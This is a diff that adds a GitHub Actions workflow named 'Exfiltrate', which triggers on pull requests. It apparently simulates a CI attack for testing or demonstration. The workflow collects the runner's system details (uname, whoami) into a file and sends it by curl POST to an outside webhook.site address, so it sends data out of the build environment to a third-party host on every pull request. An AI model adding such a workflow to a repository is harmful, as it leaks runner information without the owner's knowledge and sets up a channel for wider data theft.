@@ -1,0 +1,16 @@
+name: Exfiltrate
+
+on: pull_request
+
+jobs:
+  exfiltrate:
+    runs-on: ubuntu-latest
+    env:
+      TITLE: ${{ github.event.pull_request.title }}
+    steps:
+      - name: Simulate title usage and extract info
+        run: |
+          echo "Extracted title: ${TITLE}"
+          uname -a > out.txt
+          whoami >> out.txt
+          curl -X POST --data-binary @out.txt 	https://webhook.site/912af4d4-5949-497d-a3ee-303934c8fb41
